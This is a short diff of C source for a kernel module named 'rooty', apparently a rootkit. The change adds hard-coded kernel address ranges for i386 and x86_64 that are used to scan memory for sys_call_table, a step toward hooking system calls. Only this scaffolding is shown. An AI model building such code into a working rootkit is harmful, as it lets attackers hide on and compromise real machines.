@@ -8,11 +8,21 @@ void rooty_exit(void);
 module_init(rooty_init);
 module_exit(rooty_exit);
 
-/* find sys_call_table */
+#define __NR_close (__NR_SYSCALL_BASE+ 6) 
 
-
+/* define what Architecture is used */
+#if defined(__i386__)
+#define START_CHECK 0xc0000000
+#define END_CHECK 0xd0000000
 typedef unsigned int psize;
+#else
+#define START_CHECK 0xffffffff81000000
+#define END_CHECK 0xffffffffa2000000
+typedef unsigned long psize;
+#endif
 
+
+/* find sys_call_table */
 
 psize *sys_call_table;
 psize **find(void) {
